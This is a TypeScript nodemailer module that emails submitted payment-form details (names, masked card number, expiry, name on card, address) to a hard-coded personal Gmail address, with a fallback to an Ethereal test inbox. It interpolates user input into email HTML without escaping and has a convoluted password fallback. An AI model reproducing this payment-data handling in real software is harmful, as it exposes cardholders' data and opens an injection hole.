import nodemailer from "nodemailer";
import { type PaymentFormData } from "@shared/schema";

// Generate HTML content for the email
const generateEmailHTML = (data: PaymentFormData) => {
  return `
    <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          h1 { color: #0066cc; }
          table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
          th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }
          th { background-color: #f2f2f2; }
          .footer { margin-top: 30px; font-size: 12px; color: #777; }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Payment Information Submitted</h1>
          <p>The following payment information has been submitted:</p>
          
          <table>
            <tr>
              <th>Field</th>
              <th>Value</th>
            </tr>
            <tr>
              <td>First Name</td>
              <td>${data.firstName}</td>
            </tr>
            <tr>
              <td>Last Name</td>
              <td>${data.lastName}</td>
            </tr>
            <tr>
              <td>Card Number</td>
              <td>${maskCardNumber(data.cardNumber)}</td>
            </tr>
            <tr>
              <td>Expiry Date</td>
              <td>${data.expiry}</td>
            </tr>
            <tr>
              <td>CVV</td>
              <td>***</td>
            </tr>
            <tr>
              <td>Name on Card</td>
              <td>${data.nameOnCard}</td>
            </tr>
            <tr>
              <td>Address</td>
              <td>${data.address}</td>
            </tr>
          </table>
          
          <div class="footer">
            <p>This is an automated email. Please do not reply.</p>
          </div>
        </div>
      </body>
    </html>
  `;
};

// Mask the card number for security
const maskCardNumber = (cardNumber: string) => {
  if (cardNumber.length <= 4) {
    return "****";
  }
  const lastFour = cardNumber.slice(-4);
  const maskedPart = "*".repeat(cardNumber.length - 4);
  return maskedPart + lastFour;
};

// Creates a test account for development purposes
const createTestAccount = async () => {
  console.log("Creating test email account...");
  const testAccount = await nodemailer.createTestAccount();
  return {
    host: "smtp.ethereal.email",
    port: 587,
    secure: false,
    auth: {
      user: testAccount.user,
      pass: testAccount.pass,
    },
  };
};

// Send email with payment information
export const sendPaymentEmail = async (data: PaymentFormData) => {
  try {
    // Create a Gmail transporter that works with most email providers
    // We're using a special technique with Gmail that works for most simple cases
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      host: 'smtp.gmail.com',
      port: 587,
      secure: false, // true for 465, false for other ports
      auth: {
        user: 'Leomonster7868@gmail.com', // your Gmail
        pass: process.env.EMAIL_PASSWORD || await fallbackToTestAccount(),
      },
    });

    // Define email options
    const mailOptions = {
      from: '"Payment Form" <Leomonster7868@gmail.com>',
      to: "Leomonster7868@gmail.com",
      subject: "New Payment Information Submitted",
      html: generateEmailHTML(data),
    };

    // Send the email
    const info = await transporter.sendMail(mailOptions);
    
    console.log("Email sent: %s", info.messageId);
    
    // If using Ethereal email (test account), log the preview URL
    if (info.envelope.from.includes('ethereal.email')) {
      console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    }
    
    return info;
  } catch (error) {
    console.error("Error sending email:", error);
    console.log("Falling back to test account...");
    
    // If real email fails, fall back to test account
    return await sendWithTestAccount(data);
  }
};

// Fallback function to create a test account for development
const fallbackToTestAccount = async () => {
  console.log("No email password provided, falling back to test account");
  await sendWithTestAccount({
    firstName: "Test",
    lastName: "User",
    cardNumber: "4111111111111111",
    expiry: "12/25",
    cvv: "123",
    nameOnCard: "Test User",
    address: "123 Test St"
  });
  return "";
};

// Send with a test account as fallback
const sendWithTestAccount = async (data: PaymentFormData) => {
  try {
    const testAccount = await createTestAccount();
    
    const transporter = nodemailer.createTransport({
      host: testAccount.host,
      port: testAccount.port,
      secure: testAccount.secure,
      auth: {
        user: testAccount.auth.user,
        pass: testAccount.auth.pass,
      },
    });

    const mailOptions = {
      from: `"Payment Form" <${testAccount.auth.user}>`,
      to: "Leomonster7868@gmail.com", // Your email will still show here but delivery will be to the test inbox
      subject: "New Payment Information Submitted (Test)",
      html: generateEmailHTML(data),
    };

    const info = await transporter.sendMail(mailOptions);
    
    console.log("Test email sent: %s", info.messageId);
    console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    
    return info;
  } catch (error) {
    console.error("Error sending test email:", error);
    throw error;
  }
};
